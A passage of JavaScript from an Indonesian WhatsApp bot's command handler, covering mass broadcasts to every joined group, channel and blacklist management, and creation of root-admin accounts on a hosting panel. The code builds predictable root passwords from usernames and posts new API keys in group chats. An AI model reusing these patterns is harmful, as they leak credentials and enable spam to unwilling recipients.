 if (!/video/.test(mime)) return m.reply(example("teks dengan mengirim video"));
 
 const allgrup = await conn.groupFetchAllParticipating();
 const res = await Object.keys(allgrup);
 let count = 0;
 const teks = text;
 const jid = m.chat;
 const rest = await conn.downloadAndSaveMediaMessage(qmsg);
 
 await m.reply(`*Memproses jpm teks & video ke ${res.length} grup*`);
 
 for (let i of res) {
 // Lewati grup yang ada dalam daftar blacklist
 if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
 try {
 // Kirim video dengan caption
 await conn.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm });
 count += 1;
 } catch {}
 await sleep(global.delayJpm); // Beri jeda pengiriman antar grup
 }
 
 await fs.unlinkSync(rest); // Hapus file sementara setelah selesai
 await conn.sendMessage(jid, { text: `*JPM Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addid": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply('❌ Masukkan ID atau link saluran yang ingin ditambahkan.');

  try {
    // Cek apakah input link atau ID
    let id = text.includes("https://whatsapp.com/channel/")
      ? text.split("https://whatsapp.com/channel/")[1].trim()
      : text.trim();

    // Validasi panjang ID
    if (!id || id.length < 10) return m.reply("❌ ID saluran tidak valid.");

    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    // Cek apakah ID sudah ada
    if (daftarSaluran.includes(id)) {
      return m.reply('❌ ID saluran sudah ada dalam daftar.');
    }

    // Tambahkan ID baru
    daftarSaluran.push(id);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil ditambahkan:\n${id}`);
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listid": {
 if (!isCreator) return m.reply(mess.owner);

 try {
 // Baca file JSON
 let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

 if (daftarSaluran.length === 0) {
 return m.reply('❌ Tidak ada ID saluran yang terdaftar.');
 }

 // Kirim daftar ID
 let teks = '📋 *Daftar ID Saluran:*\n\n';
 daftarSaluran.forEach((id, i) => {
 teks += `${i + 1}. ${id}\n`;
 });
 m.reply(teks);
 } catch (error) {
 console.error("Error saat membaca daftar ID:", error);
 m.reply('❌ Terjadi kesalahan saat membaca daftar ID.');
 }
 }
 break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delid": {
 if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply('❌ Masukkan ID saluran yang ingin dihapus.');

 try {
 // Baca file JSON
 let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

 // Cek apakah ID ada dalam daftar
 if (!daftarSaluran.includes(text)) {
 return m.reply('❌ ID saluran tidak ditemukan dalam daftar.');
 }

 // Hapus ID
 daftarSaluran = daftarSaluran.filter(id => id !== text);

 // Simpan kembali ke file JSON
 fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
 m.reply(`✅ ID saluran berhasil dihapus: ${text}`);
 } catch (error) {
 console.error("Error saat menghapus ID:", error);
 m.reply('❌ Terjadi kesalahan saat menghapus ID.');
 }
 }
 break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delallid": {
 if (!isCreator) return m.reply(mess.owner);

 try {
 // Reset file JSON dengan array kosong
 fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify([], null, 2));
 
 m.reply('✅ Semua ID saluran telah dihapus.');
 } catch (error) {
 console.error("Error saat mereset ID:", error);
 m.reply('❌ Terjadi kesalahan saat menghapus semua ID.');
 }
 break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addallid": {
 if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply('❌ Masukkan satu atau lebih ID saluran yang ingin ditambahkan (pisahkan dengan spasi atau koma) *Contoh ( .addallid id1, id2*.');

 try {
 // Baca file JSON
 let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

 // Pisahkan input menjadi array (bisa dipisahkan dengan spasi atau koma)
 let idBaru = text.split(/[\s,]+/).filter(id => id.trim() !== "");

 // Filter ID yang belum ada dalam daftar
 let idBerhasilDitambahkan = [];
 let idSudahAda = [];

 idBaru.forEach(id => {
 if (daftarSaluran.includes(id)) {
 idSudahAda.push(id);
 } else {
 daftarSaluran.push(id);
 idBerhasilDitambahkan.push(id);
 }
 });

 // Simpan kembali ke file JSON jika ada ID baru yang ditambahkan
 if (idBerhasilDitambahkan.length > 0) {
 fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
 }

 // Kirim respons
 let pesan = '✅ Hasil Penambahan ID:\n';
 if (idBerhasilDitambahkan.length > 0) {
 pesan += `- ID baru ditambahkan: ${idBerhasilDitambahkan.join(', ')}\n`;
 }
 if (idSudahAda.length > 0) {
 pesan += `- ID sudah ada dalam daftar: ${idSudahAda.join(', ')}`;
 }
 
 m.reply(pesan.trim());
 } catch (error) {
 console.error("Error saat menambahkan ID:", error);
 m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
 }
 break;
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bljpm": case "blacklistjpm": case "blgc": {
    if (!m.isGroup) return Reply(mess.group)
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply(example("on/off"))

    let teks = text.toLowerCase()

    // Pastikan data group ada
    if (!global.db.groups) global.db.groups = {}
    if (!global.db.groups[m.chat]) {
        global.db.groups[m.chat] = {
            blacklistjpm: false
            // tambahkan properti lain kalau ada
        }
    }

    if (teks == "on") {
        if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
        global.db.groups[m.chat].blacklistjpm = true
        return m.reply("✅ Berhasil menyalakan *blacklistjpm* di grup ini")
    } else if (teks == "off") {
        if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini sudah tidak aktif!`)
        global.db.groups[m.chat].blacklistjpm = false
        return m.reply("✅ Berhasil mematikan *blacklistjpm* di grup ini")
    } else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delbljpm": {
    if (!isCreator) return m.reply(mess.owner)
    
    let groupId = args[0] // Format: !delbljpm <group_id>
    if (!groupId) return m.reply('Silakan masukkan ID grup. Contoh: !delbljpm 1234567890-123456@g.us')
    if (!groupId.endsWith('@g.us')) return m.reply('ID grup tidak valid. Contoh ID grup: 1234567890-123456@g.us')

    if (!global.db.groups) global.db.groups = {}
    if (!global.db.groups[groupId]) return m.reply('Grup tidak ditemukan di database.')

    delete global.db.groups[groupId].blacklistjpm

    // Hapus objek grup sepenuhnya jika sudah kosong
    if (Object.keys(global.db.groups[groupId]).length === 0) {
        delete global.db.groups[groupId]
        return m.reply(`✅ Data *blacklistjpm* dan entri grup berhasil dihapus dari database.`)
    }

    return m.reply(`✅ Data *blacklistjpm* berhasil dihapus dari grup ${groupId}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listdaftarbl": {
 if (!isCreator) return m.reply('Perintah ini hanya untuk pemilik bot.');

 // Cek apakah database grup sudah ada
 if (!global.db.groups) global.db.groups = {};

 // Ambil semua grup yang di-blacklist
 let blacklistGroups = Object.entries(global.db.groups)
 .filter(([id, data]) => data.blacklistjpm === true);

 // Jika tidak ada grup yang di-blacklist
 if (blacklistGroups.length === 0) {
 return m.reply('Tidak ada grup yang di-blacklist.');
 }

 // Buat daftar grup yang di-blacklist
 let list = '*Daftar Grup Blacklist JPM:*\n\n';
 for (let [id, data] of blacklistGroups) {
 let groupMetadata = await conn.groupMetadata(id).catch(() => null); // Ambil info grup
 let groupName = groupMetadata ? groupMetadata.subject : 'Grup tidak ditemukan';
 list += `• *Nama Grup:* ${groupName}\n *ID Grup:* ${id}\n\n`;
 }

 // Kirim daftar
 m.reply(list.trim());
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listonline": case "liston": {
				if (!m.isGroup) return Reply(mess.group);
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await conn.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => Reply('*Data tidak ditemukan! ☹️*'))
			}
			break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addownerall": {
 if (!isCreator) return Reply(mess.owner)
 if (!m.isGroup) return Reply(mess.group)

 const metadata = await conn.groupMetadata(m.chat)
 let added = 0

 for (let participant of metadata.participants) {
 if (
 participant.id === botNumber || 
 owners.includes(participant.id) || 
 participant.id === global.owner
 ) continue

 owners.push(participant.id)
 added++
 }

 await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))

 if (added === 0) {
 Reply("Semua member grup ini sudah menjadi owner sebelumnya.")
 } else {
 Reply(`Berhasil menambah ${added} member sebagai owner bot ✅`)
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delownerall": {
 if (!isCreator) return Reply(mess.owner);

 // Pastikan database ada sebelum mencoba menghapus
 if (!Array.isArray(owners) || owners.length === 0) {
 return Reply("Tidak ada owner tambahan yang terdaftar saat ini!");
 }

 // Buat salinan baru dari daftar owner, hanya menyisakan owner utama
 let updatedOwners = owners.filter(owner => owner === global.owner);

 // Simpan perubahan ke file database
 try {
 await fs.writeFileSync("./library/database/owner.json", JSON.stringify(updatedOwners, null, 2));
 
 // Perbarui daftar owner di dalam program
 owners.length = 0; // Kosongkan array asli
 owners.push(...updatedOwners); // Tambahkan kembali owner utama
 
 Reply("Semua owner tambahan telah berhasil dihapus ✅");
 } catch (err) {
 console.error("Error saat menyimpan database:", err);
 Reply("Terjadi kesalahan saat menghapus owner ❌");
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setnamabot": {
 if (!isCreator) return Reply(mess.owner) // hanya creator yang bisa pakai

 if (!q) return Reply('Masukkan nama baru untuk bot!\nContoh: setnamabot MyBotBaru') // jika tidak ada argumen
 
 try {
 await conn.updateProfileName(q) // mengubah nama profil bot
 Reply(`Berhasil mengganti nama bot menjadi *${q}* ✅`)
 } catch (e) {
 console.error(e)
 Reply('Gagal mengganti nama bot ❌')
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setbiobot": {
 if (!isCreator) return Reply(mess.owner)
 if (!text) return Reply(`Contoh penggunaan:\n${prefix}setbiobot Teks Bio Baru`)
 try {
 await conn.updateProfileStatus(text) // fungsi untuk ganti bio di WhatsApp
 Reply("Berhasil mengganti bio bot ✅")
 } catch (err) {
 console.log(err)
 Reply("Gagal mengganti bio bot ❌")
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "spekvps": {
if (!isCreator) return Reply(`❌ *Akses Ditolak!*\nHanya *Developer* yang dapat mengakses informasi ini.`);
    // Menghitung waktu runtime bot
    const botRuntime = runtime(process.uptime());
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let tio = await nou.os.oos();
    var tot = await nou.drive.info();
Reply(`🔴 *Informasi Server:*\n🖥️ *Platform:* ${nou.os.type()}\n💾 *Total RAM:* ${formatp(os.totalmem())}\n🗄️ *Total Disk:* ${tot.totalGb} GB\n⚙️ *Total CPU:* ${os.cpus().length} Core\n🔄 *Runtime VPS:* ${runtime(os.uptime())}\n⚡ *Respon Speed:* ${latensi.toFixed(4)} detik\n\n© 2025 ${global.botname2}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buatgc":
case "creategc":
 if (!isCreator) return Reply(mess.owner)
 if (!isPc) return Reply(`*[ Akses Ditolak ]*\n*Perintah ini hanya bisa digunakan di Private Chat!*`)
 if (!text.includes('|')) return Reply(`*Contoh Penggunaan*:\n${prefix+command} Nama Group | Bio Group`)

 let [groupName, groupBio] = text.split('|').map(v => v.trim());

 if (!groupName || !groupBio) return Reply(`*Contoh Penggunaan*:\n${prefix+command} Nama Group | Bio Group`)

 try {
 let creat = await conn.groupCreate(groupName, [])
 let kiya = await conn.groupInviteCode(creat.id)

 // Mengatur deskripsi grup (bio)
 await conn.groupUpdateDescription(creat.id, groupBio)

 let groupLink = `https://chat.whatsapp.com/${kiya}`
 let message = `✅ *SUKSES MEMBUAT GROUP* ✅\n\n📌 *Nama:* ${groupName}\n📝 *Bio:* ${groupBio}\n🔗 *Link:* ${groupLink}`

 await conn.sendMessage(m.chat, { text: message })
 Reply('✅ Pesan dan link grup telah terkirim ke chat Anda!')

 } catch (error) {
 console.error(error)
 Reply('❌ Gagal membuat grup. Pastikan akun memiliki izin untuk membuat grup!')
 }
 break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin-v1": {
  if (!isCreator) return Reply(mess.owner);

  let data = global.tempCadmin?.[m.sender];
  if (!data) return Reply("❌ Data tidak ditemukan. Ketik `.cadmin nama,nomor` dulu.");

  delete global.tempCadmin[m.sender];

  let username = data.username;
  let email = username + "@gmail.com";
  let password = username + "v1admin";

  let res = await fetch(global.domain + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikey
    },
    body: JSON.stringify({
      email,
      username,
      first_name: data.name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let json = await res.json();
  if (json.errors) return Reply("❌ Error V1: " + JSON.stringify(json.errors[0], null, 2));

  let user = json.attributes;

  let tujuan = data.nomor + "@s.whatsapp.net";
  let teks = `
✅ *Admin Panel V1 Berhasil Dibuat*

🆔 ID: ${user.id}
👤 Nama: ${data.name}
💻 Username: ${username}
🔐 Password: ${password}
🌐 Panel: ${global.domain}

📞 Kontak: wa.me/${data.nomor}

*📜 Rules Admin Panel ⚠️*
1️⃣ Jangan Maling SC, Ketahuan? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian
 `.trim();

  // Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(tujuan, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domain}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: tujuan, quoted: m });

  await conn.relayMessage(tujuan, msg.message, { messageId: msg.key.id });

  // Notifikasi ke pengirim command
  await conn.sendMessage(m.chat, {
    text: `✅ Akun admin berhasil dibuat & sudah dikirim ke nomor: wa.me/${data.nomor}`
  }, { quoted: m });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin-v2": {
  if (!isCreator) return Reply(mess.owner);

  let data = global.tempCadmin?.[m.sender];
  if (!data) return Reply("❌ Data tidak ditemukan. Ketik `.cadmin nama,nomor` dulu.");

  delete global.tempCadmin[m.sender];

  let username = data.username;
  let email = username + "@gmail.com";
  let password = username + "v2admin";

  let res = await fetch(global.domainV2 + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    },
    body: JSON.stringify({
      email,
      username,
      first_name: data.name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let json = await res.json();
  if (json.errors) return Reply("❌ Error V2: " + JSON.stringify(json.errors[0], null, 2));

  let user = json.attributes;

  let tujuan = data.nomor + "@s.whatsapp.net";
  let teks = `
✅ *Admin Panel V2 Berhasil Dibuat*

🆔 ID: ${user.id}
👤 Nama: ${data.name}
💻 Username: ${username}
🔐 Password: ${password}
🌐 Panel: ${global.domainV2}

📞 Kontak: wa.me/${data.nomor}

*📜 Rules Admin Panel ⚠️*
1️⃣ Jangan Maling SC, Ketahuan? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian
 `.trim();

  // Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(tujuan, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domainV2}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: tujuan, quoted: m });

  await conn.relayMessage(tujuan, msg.message, { messageId: msg.key.id });

  // Notifikasi ke pengirim command
  await conn.sendMessage(m.chat, {
    text: `✅ Akun admin berhasil dibuat & sudah dikirim ke nomor: wa.me/${data.nomor}`
  }, { quoted: m });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadp": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("masukkan username"));

  // Simpan username sementara di user session (simple pakai global object)
  global.tempUser = global.tempUser || {};
  global.tempUser[m.sender] = text;

  await conn.sendMessage(m.chat, {
    caption: `🧩 Username: *${text}*\nSilakan pilih versi server untuk membuat akun Admin Panel:`,
    image: { url: global.image.reply }, // atau ubah jadi file lokal seperti { url: './reply.jpg' }
    footer: `© 2025 ${botname}`,
    buttons: [
      { buttonId: '.cadp-v1', buttonText: { displayText: '🌐 Panel Server V1' }, type: 1 },
      { buttonId: '.cadp-v2', buttonText: { displayText: '🌐 Panel Server V2' }, type: 1 }
    ],
    headerType: 4 // 4 = imageMessage
  }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadp-v1": {
  if (!isCreator) return Reply(mess.owner);

  let username = global.tempUser?.[m.sender];
  if (!username) return Reply("❌ Username tidak ditemukan. Ketik `.cadp <username>` terlebih dahulu.");

  delete global.tempUser[m.sender]; // hapus setelah dipakai
  let email = username + "@gmail.com";
  let name = capital(username);
  let password = username + "ocho";

  let f = await fetch(global.domain + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikey
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let data = await f.json();
  if (data.errors) return Reply("❌ Error V1: " + JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  let orang = m.isGroup ? m.sender : m.chat;
  if (m.isGroup) await Reply("✅ *Admin Panel V1 berhasil dibuat!* \nData akun sudah dikirim ke private chat.");

  let teks = `
*✅ Admin Panel V1 Berhasil Dibuat*

*🆔 ID:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔐 Password:* ${password}
*🌐 Login:* ${global.domain}

📜 *Rules Admin Panel ⚠️*
1️⃣ Jangan maling SC! Ketahuan? Akun dihapus!
2️⃣ Simpan baik-baik data akun ini
3️⃣ Jangan spam bikin panel
4️⃣ Garansi: 10 hari
5️⃣ Claim garansi wajib bawa bukti SS chat
  `.trim();

  // ✅ Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(orang, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${user.username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domain}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: orang, quoted: m });

  await conn.relayMessage(orang, msg.message, { messageId: msg.key.id });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadp-v2": {
  if (!isCreator) return Reply(mess.owner);

  let username = global.tempUser?.[m.sender];
  if (!username) return Reply("❌ Username tidak ditemukan. Ketik `.cadp <username>` terlebih dahulu.");

  delete global.tempUser[m.sender]; // hapus setelah dipakai
  let email = username + "@gmail.com";
  let name = capital(username);
  let password = username + "ocho";

  let f = await fetch(global.domainV2 + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let data = await f.json();
  if (data.errors) return Reply("❌ Error V1: " + JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  let orang = m.isGroup ? m.sender : m.chat;
  if (m.isGroup) await Reply("✅ *Admin Panel V2 berhasil dibuat!* \nData akun sudah dikirim ke private chat.");

  let teks = `
*✅ Admin Panel V2 Berhasil Dibuat*

*🆔 ID:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔐 Password:* ${password}
*🌐 Login:* ${global.domainV2}

📜 *Rules Admin Panel ⚠️*
1️⃣ Jangan maling SC! Ketahuan? Akun dihapus!
2️⃣ Simpan baik-baik data akun ini
3️⃣ Jangan spam bikin panel
4️⃣ Garansi: 10 hari
5️⃣ Claim garansi wajib bawa bukti SS chat
  `.trim();

  // ✅ Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(orang, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${user.username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domainV2}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: orang, quoted: m });

  await conn.relayMessage(orang, msg.message, { messageId: msg.key.id });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//CASE UP DOMAIN BUTTON//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "updomain": {
  if (!args[0]) return m.reply('❗ Masukkan link domain!\nContoh: *.updomain https://namadomain.com*');

  const linkDomain = args[0];

  await conn.sendMessage(m.chat, {
    caption: `🌐 Domain yang akan diupdate:\n${linkDomain}\n\nSilakan pilih server tempat domain akan diterapkan:`,
    image: { url: global.image.reply },
    footer: `© 2025 ${botname} 🚀`,
    buttons: [
      {
        buttonId: `.updomain-v1 ${linkDomain}`,
        buttonText: { displayText: '🌐 Server V1' },
        type: 1
      },
      {
        buttonId: `.updomain-v2 ${linkDomain}`,
        buttonText: { displayText: '🌐 Server V2' },
        type: 1
      }
    ],
    headerType: 1,
    viewOnce: true
  }, { quoted: qtext2 });
}
break;

case "updomain-v1": {
  const newDomain = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
  if (!newDomain) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://domain.com`);
  }

  global.domain = newDomain;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  Reply(`✅ *Domain untuk Server V1 berhasil diupdate!*\n\n🌐 *${newDomain}*`);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, {
    text: `📢 *Perubahan Domain Server V1*\n\n🌐 *Domain Baru:* ${newDomain}\n🕒 *Waktu:* ${waktu}`,
  });
}
break;

case "updomain-v2": {
  const newDomain = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
  if (!newDomain) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://domain.com`);
  }

  global.domainV2 = newDomain;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

  Reply(`✅ *Domain untuk Server V2 berhasil diupdate!*\n\n🌐 *${newDomain}*`);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, {
    text: `📢 *Perubahan Domain Server V2*\n\n🌐 *Domain Baru:* ${newDomain}\n🕒 *Waktu:* ${waktu}`,
  });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//CASE UP APIKEY BUTTON//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upapikey": {
  if (!args[0]) return m.reply('❗ Masukkan API Key!\nContoh: *.upapikey API_KEY_KAMU*');

  const apiKey = args[0];

  await conn.sendMessage(m.chat, {
    caption: `🔐 API Key yang akan diupdate:\n${apiKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
    image: { url: global.image.reply },
    footer: `© 2025 ${botname} 🚀`,
    buttons: [
      {
        buttonId: `.upapikey-v1 ${apiKey}`,
        buttonText: { displayText: '🛠️ Server V1' },
        type: 1
      },
      {
        buttonId: `.upapikey-v2 ${apiKey}`,
        buttonText: { displayText: '🛠️ Server V2' },
        type: 1
      }
    ],
    headerType: 1,
    viewOnce: true
  }, { quoted: qtext2 });
}
break;

case "upapikey-v1": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} API_KEY_KAMU`);
  }

  global.apikey = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *API Key untuk Server V1 berhasil diupdate!*\n\n🔑 *API Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan API Key V1*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

case "upapikey-v2": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} API_KEY_KAMU`);
  }

  global.apikeyV2 = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *API Key untuk Server V2 berhasil diupdate!*\n\n🔑 *API Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan API Key V2*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//CASE UP CAPIKEY BUTTON//
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upcapikey": {
  if (!args[0]) return m.reply('❗ Masukkan Caddy API Key!\nContoh: *.upcapikey API_KEY_CADDY*');

  const caddyKey = args[0];

  await conn.sendMessage(m.chat, {
    caption: `🔐 Caddy API Key yang akan diupdate:\n${caddyKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
    image: { url: global.image.reply },
    footer: `© 2025 ${botname} 🚀`,
    buttons: [
      {
        buttonId: `.upcapikey-v1 ${caddyKey}`,
        buttonText: { displayText: '🛠️ Server V1' },
        type: 1
      },
      {
        buttonId: `.upcapikey-v2 ${caddyKey}`,
        buttonText: { displayText: '🛠️ Server V2' },
        type: 1
      }
    ],
